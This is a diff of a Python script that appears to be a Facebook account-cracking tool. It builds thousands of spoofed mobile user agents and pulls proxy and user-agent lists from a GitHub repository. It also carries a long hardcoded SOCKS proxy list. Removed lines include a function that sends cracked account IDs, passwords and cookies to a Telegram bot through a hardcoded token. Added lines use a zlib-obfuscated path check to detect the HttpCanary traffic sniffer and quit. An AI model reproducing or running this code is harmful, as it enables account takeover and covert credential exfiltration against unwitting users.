@@ -1,973 +1,495 @@
-#-------------------------WRITTEN BY MR-NIX--------------
-#-------------------------- Code by MR-ERROR&NIX-----------
-#-------------------Hello World -----------------------------
-#SC MAKED BY NIX
+# Open Source By SYED-ZADA
+
+samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
+
 import os
-from os import system as clr
 from os import path
-import os,base64,zlib,pip,urllib
-import uuid
-import os,sys,time,json,random,re,string,platform,base64
+from pathlib import Path
+import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+print('\n [√] Wait Installing Modules...!')
+os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
+print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
-import uuid
-import os,sys,time,json,random,re,string,platform,base64
-try:
-###----------[ IMPORT LIBRARY ]---------- ###
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
-import uuid
-import os,sys,time,json,random,re,string,platform,base64
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python run.py')
-fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
-	print('\x1b[1;95m[√] LOADING...')
-	
-prox=open('.prox.txt','r').read().splitlines()
-
-ugen2=[]
-ugen=[]
-try:
-    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-    open('proxies.txt','w').write(proxies)
-except Exception as e:
-    print('')
-proxies=open('proxies.txt','r').read().splitlines()
-android_models=[]
-try:
-    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
-    for line in xx:
-        android_models.append(line)
-except:pass
-usr=[]
-try:
-    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
-    for us in xd:
-        usr.append(us)
-except: pass
-
-
-for xd in range(5000):
-	
-	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-	c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-	ugen.append(uaku2)
-
-for agent in range(10000):
-	
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-
-for xd in range(10000):
-	a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
-	e=random.randrange(100, 9999)
-	#f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen.append(uaku)
-
-	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c=' en-us; GT-'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-	
-
-# Open Source By Sakin-69
-from os import path
-from urllib.request import urlopen
-import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
-import os,base64,zlib,pip,urllib
-import os,zlib,time,datetime
-from concurrent.futures import ThreadPoolExecutor as tred
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-import os
-import requests
-#import httpx
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-import os
-os.system('git pull')
-os.system('mkdir NIX')
-
-import os,zlib
-
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-print('         \x1b[38;5;46m WELCOME TO NIX WORLD          ')
-
-
-try:
-    import requests 
+    import requests,os,json,time,re,random,sys,uuid,string
+    from string import *
+    from requests import api
+    from concurrent.futures import ThreadPoolExecutor as tred
 except ImportError:
-    print('\n  installing Requests ...\n')
-    os.system('pip install requests')
+    os.system('pip install requests futures==2 > /dev/null')
+    os.system('python VENOM.py')
 
-def getKey():
-
-    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
-    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
-    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
-    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
-    bxd = ""
-    bumper = bxd+id+xp
-    return bumper
 try:
-    import concurrent.futures
-except ImportError:
-    print('\n  installing futures ...\n')
-    os.system('pip install futures')
-    
-
-
-
-def Elite(id,ps,coki):
-    try:
-        import requests
-        token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add yout token 
-        chatid = "6619837127"#Add your Chat Id
-        ok_id =str(id+"|"+ps+"|"+coki)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        params = {"chat_id": chatid, "text": ok_id}
-        requests.get(url, params=params)
-    except:
+    g = "anar"
+    f="tt"
+    file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+    if f'com.h{f}pc{g}y.pro' in file_d:
+        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
+        exit()
+    else:
         pass
-    
+except Exception as e:
+    pass
+
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
+
+ 
+proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001', '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153', '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299', '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294', '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722', '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172', '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999', '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772', '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566', '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678', '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', 